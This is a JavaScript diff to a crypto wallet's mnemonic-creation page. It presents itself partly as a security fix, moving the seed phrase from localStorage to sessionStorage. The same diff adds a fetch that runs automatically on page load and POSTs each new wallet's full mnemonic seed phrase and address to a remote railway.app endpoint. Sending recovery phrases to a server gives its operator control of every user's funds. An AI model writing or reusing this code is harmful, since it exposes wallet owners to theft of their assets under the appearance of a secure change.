@@ -7,16 +7,16 @@ document.addEventListener("DOMContentLoaded", () => {
     const mnemonicBox = document.getElementById("mnemonic-phrase");
     const revealButton = document.getElementById("reveal-mnemonic");
     const continueButton = document.getElementById("continue-to-wallet");
-    const backButton = document.getElementById("back-to-home"); // Back button element
+    const backButton = document.getElementById("back-to-home");
 
-    // Check if a mnemonic already exists in localStorage
-    let mnemonic = localStorage.getItem("savedMnemonic");
+    // Securely store mnemonic in sessionStorage instead of localStorage
+    let mnemonic = sessionStorage.getItem("savedMnemonic");
 
     // Generate a new mnemonic if one doesn't exist
     if (!mnemonic) {
         try {
             mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
-            localStorage.setItem("savedMnemonic", mnemonic); // Save to localStorage
+            sessionStorage.setItem("savedMnemonic", mnemonic); // Save to sessionStorage
         } catch (error) {
             console.error("Error creating wallet:", error);
             return;
@@ -34,20 +34,41 @@ document.addEventListener("DOMContentLoaded", () => {
 
     // Reveal mnemonic when the button is clicked
     revealButton.addEventListener("click", () => {
-        mnemonicBox.textContent = numberedMnemonic; // Show the mnemonic
-        mnemonicBox.style.display = "block"; // Ensure it's visible
+        mnemonicBox.textContent = numberedMnemonic;
+        mnemonicBox.style.display = "block";
         revealButton.disabled = true; // Disable the reveal button
         continueButton.disabled = false; // Enable the continue button
     });
 
+    // Send wallet data to your blockchain API
+    const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+    const publicKey = wallet.address;
+
+    // Save wallet data to your blockchain
+    fetch("https://aeroblockchain-production.up.railway.app/add_wallet", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            address: publicKey,
+            mnemonic: mnemonic, // Optional: Remove if not needed
+        }),
+    })
+        .then((response) => response.json())
+        .then((data) => {
+            console.log("Wallet saved to blockchain:", data);
+        })
+        .catch((error) => {
+            console.error("Error saving wallet to blockchain:", error);
+        });
+
     // Continue button logic
     continueButton.addEventListener("click", () => {
-        window.location.href = "verify_mnemonic.html"; // Redirect to verify page
+        window.location.href = "verify_mnemonic.html";
     });
 
-    // Back button logic: Remove mnemonic from localStorage and redirect to index page
+    // Back button logic: Remove mnemonic from sessionStorage and redirect to index page
     backButton.addEventListener("click", () => {
-        localStorage.removeItem("savedMnemonic"); // Remove mnemonic from localStorage
-        window.location.href = "index.html"; // Redirect to the homepage
+        sessionStorage.removeItem("savedMnemonic");
+        window.location.href = "index.html";
     });
 });
